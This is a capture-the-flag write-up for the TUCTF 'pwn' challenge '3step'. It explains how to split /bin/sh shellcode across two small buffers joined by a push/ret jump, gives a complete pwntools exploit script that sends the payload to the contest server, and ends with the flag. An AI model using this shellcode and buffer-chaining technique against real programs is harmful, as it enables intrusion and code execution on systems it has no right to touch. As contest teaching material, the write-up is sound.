# 3step

## PWN - Points: 500

> Gonna have to get crafty with this one.
>
> 
>
> nc chal.tuctf.com 30504
>
> [3step](3step)
>

Shellcode needs to be split up into two small buffers. Call the first buffer to execute the first part of the shellcode plus a jump to the second buffer, that contains the second part of the shellcode.

Exploit script:

```python
from pwn import *


shell1 = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68"
shell2 = "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# p = process('3step')
p = remote('chal.tuctf.com', 30504)

p.recvline()
p.recvline()
first = int(p.recvline()[:-1], 16)
second = int(p.recvline()[:-1], 16)

jmp = asm('push {}; ret;'.format(hex(second)), arch='i386',os='linux')

p.sendlineafter(': ', shell1 + jmp)
p.sendlineafter(': ', shell2)
p.sendlineafter(': ', p32(first))
p.interactive()
```

flag: `TUCTF{4nd_4_0n3,_4nd_4_7w0,_4nd_5h3ll_f0r_y0u!}`